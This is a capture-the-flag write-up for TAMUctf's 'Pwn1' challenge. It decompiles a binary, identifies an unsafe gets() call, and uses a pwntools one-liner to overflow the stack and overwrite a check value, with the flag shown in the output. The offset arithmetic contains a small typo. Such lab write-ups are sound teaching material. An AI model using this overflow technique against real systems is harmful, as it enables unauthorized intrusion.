# Pwn1
Pwn

## Challenge 

nc pwn.tamuctf.com 4321

Difficulty: easy

[pwn1](pwn1)

## Solution

### Solve 1st part...

Lets do a strings

	$ strings pwn1

	Right. Off you go.
	flag.txt
	Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
	What... is your name?
	Sir Lancelot of Camelot
	I don't know that! Auuuuuuuugh!
	What... is your quest?
	To seek the Holy Grail.
	What... is my secret?
	;*2$"
	GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0

Here we see some stuff which we can use to answer the questions

	$ ./pwn1 
	Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
	What... is your name?
		Sir Lancelot of Camelot
	
	What... is your quest?
		To seek the Holy Grail.
	
	What... is my secret?
		;*2$"
	I don't know that! Auuuuuuuugh!

So now it correctly answers 2 of the questions. We need to find the secret

### Decompile to understand 2nd part

We do a decompile and we see this. Let's understand it slowly...

	int main(int arg0) {
	    stack[2048] = arg0;
	    stack[2047] = *(&arg0 + 0xfffffffc);
	    stack[2046] = ebp;
	    ebp = (esp & 0xfffffff0) - 0x8;
	    stack[2045] = ebx;
	    stack[2044] = &arg0;
	    eax = __x86.get_pc_thunk.bx();
	    stack[2027] = 0x0;
	    stack[2026] = 0x0;
	    stack[2025] = 0x2;
	    stack[2024] = **(ebx + 0x1864);
	    eax = sub_580();
	    *(ebp + 0xfffffff4) = 0x2;
	    *(ebp + 0xfffffff0) = 0x0;
	    stack[2024] = ebx + 0x200;
	    eax = sub_550();
	    stack[2024] = ebx + 0x26b;
	    eax = sub_550();
	    stack[2026] = **(ebx + 0x1860);
	    stack[2025] = 0x2b;
	    stack[2024] = ebp + 0xffffffc5;
	    eax = sub_530();
	    stack[2025] = ebx + 0x281;
	    stack[2024] = ebp + 0xffffffc5;
	    esp = ((((((esp & 0xfffffff0) - 0x60) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10;
	    if (sub_510() != 0x0) {
	            stack[2024] = "I don't know that! Auuuuuuuugh!";
	            eax = sub_550();
	            stack[2024] = 0x0;
	            esp = (esp - 0x10) + 0x10 - 0x10;
	            eax = sub_560();
	    }
	    stack[2020] = "What... is your quest?";
	    eax = sub_550();
	    stack[2022] = **0x1ff0;
	    stack[2021] = 0x2b;
	    stack[2020] = ebp + 0xffffffc5;
	    eax = sub_530();
	    stack[2021] = "To seek the Holy Grail.\n";
	    stack[2020] = ebp + 0xffffffc5;
	    esp = (((esp - 0x10) + 0x10 - 0x10) + 0x10 - 0x10) + 0x10;
	    if (sub_510() != 0x0) {
	            stack[2020] = "I don't know that! Auuuuuuuugh!";
	            eax = sub_550();
	            stack[2020] = 0x0;
	            esp = (esp - 0x10) + 0x10 - 0x10;
	            eax = sub_560();
	    }
	    stack[2016] = "What... is my secret?";
	    eax = sub_550();
	    stack[2016] = ebp + 0xffffffc5;
	    eax = sub_520();
	    esp = ((esp - 0x10) + 0x10 - 0x10) + 0x10;
	    if (*(ebp + 0xfffffff0) == 0xdea110c8) {
	            eax = print_flag();
	    }
	    else {
	            stack[2016] = "I don't know that! Auuuuuuuugh!";
	            eax = sub_550();
	            esp = (esp - 0x10) + 0x10;
	    }
	    eax = 0x0;
	    ebx = stack[2019];
	    esp = ebp + 0x4;
	    ebp = stack[2020];
	    esp = stack[2018] + 0xfffffffc;
	    return 0x0;
	}

We notice it is calling a lot of functions such as `sub_530()`, `sub_510()`

I realise that the code is reading/printing to the console, so these functions must be in charge of STDIO. This made me suspect that it is calling LIBC functions. 

	void sub_530() {
	    (*(ebx + 0x14))();
	    return;
	}

	void sub_510() {
	    (*(ebx + 0xc))();
	    return;
	}

Confirm that the `ebx` points to the GOT table... Look at the GOT table and we see matching addresses.

	             _GLOBAL_OFFSET_TABLE_:
	00001fb0         db  0xb8 ; '.'
	00001fb1         db  0x1e ; '.'
	00001fb2         db  0x00 ; '.'
	00001fb3         db  0x00 ; '.'
	00001fb4         db  0x00 ; '.'
	00001fb5         db  0x00 ; '.'
	00001fb6         db  0x00 ; '.'
	00001fb7         db  0x00 ; '.'
	00001fb8         db  0x00 ; '.'
	00001fb9         db  0x00 ; '.'
	00001fba         db  0x00 ; '.'
	00001fbb         db  0x00 ; '.'
	             strcmp@GOT:        // strcmp
	00001fbc         dd         0x00003000
	             gets@GOT:        // gets
	00001fc0         dd         0x00003008
	             fgets@GOT:        // fgets
	00001fc4         dd         0x0000300c
	             _IO_getc@GOT:        // _IO_getc
	00001fc8         dd         0x00003010
	             puts@GOT:        // puts
	00001fcc         dd         0x00003018
	             exit@GOT:        // exit
	00001fd0         dd         0x00003020
	             __libc_start_main@GOT:        // __libc_start_main
	00001fd4         dd         0x00003024
	             setvbuf@GOT:        // setvbuf
	00001fd8         dd         0x0000302c
	             fopen@GOT:        // fopen
	00001fdc         dd         0x00003030
	             putchar@GOT:        // putchar
	00001fe0         dd         0x00003034

So now we know some important functions

	ebx     = GOT base [00001fb0]
	sub_530 = fgets    [00001fc4]
	sub_510 = strcmp   [00001fbc]
	sub_520 = gets     [00001fc0]

Let's rewrite the code 

	psuedocode: 
	main() {
	    // Some initialising first
	    setvbuf()
	    // ...
	    
	    // Question 1 --------------------------------
	    print "What... is your name?"
	    fgets()

	    if (strcmp() != 0) // if not matching
	    {
	        print "I don't know that! Auuuuuuuugh!"
	    }

	    // Question 2 --------------------------------
	    print "What... is your quest?"
	    fgets()

	    if (strcmp() != 0) // if not matching
	    {
	        print "I don't know that! Auuuuuuuugh!"
	    }

	    // Question 3 --------------------------------
	    print "What... is my secret?"
	    gets()

	    if (*(ebp + 0xfffffff0) == 0xdea110c8) {
	        print_flag();
	    } else {
	        print "I don't know that! Auuuuuuuugh!"
	    }
	}

Notice that question 3 uses `gets [sub_520]` instead of `fgets [sub_530]`.

Doing this yields no progress

	python -c "\
		from pwn import *;
		print 'Sir Lancelot of Camelot';
		print 'To seek the Holy Grail.'; 
		print p32(0xdea110c8);
	" | ./pwn1

Hence, now we need to check where `*(ebp + 0xfffffff0)` points to...

In assembly code, the first 2 strcmp checks for `ebp-0x3b`.
	
	00000865         lea        eax, dword [ebp-0x3b]
	00000868         push       eax
	00000869         call       sub_510 

But the last one checks for `ebp-0x10`.

	000008b2         cmp        dword [ebp-0x10], 0xdea110c8

Hence, there is a `0x3 - 0x10 = 43 decimal` offset.

Let's verify

	# python -c "\
		from pwn import *;
		print 'Sir Lancelot of Camelot';
		print 'To seek the Holy Grail.'; 
		print 'A' * 43 + p32(0xdea110c8);
	" | ./pwn1 

	Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
	What... is your name?
	What... is your quest?
	What... is my secret?
	Right. Off you go.
	Segmentation fault

Yes, it works. Do on server!

	# python -c "\
	from pwn import *;
	print 'Sir Lancelot of Camelot';
	print 'To seek the Holy Grail.'; 
	print 'A' * 43 + p32(0xdea110c8);
	" | nc pwn.tamuctf.com 4321

	Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
	What... is your name?
	What... is your quest?
	What... is my secret?
	Right. Off you go.
	gigem{34sy_CC428ECD75A0D392}

## Flag

	gigem{34sy_CC428ECD75A0D392}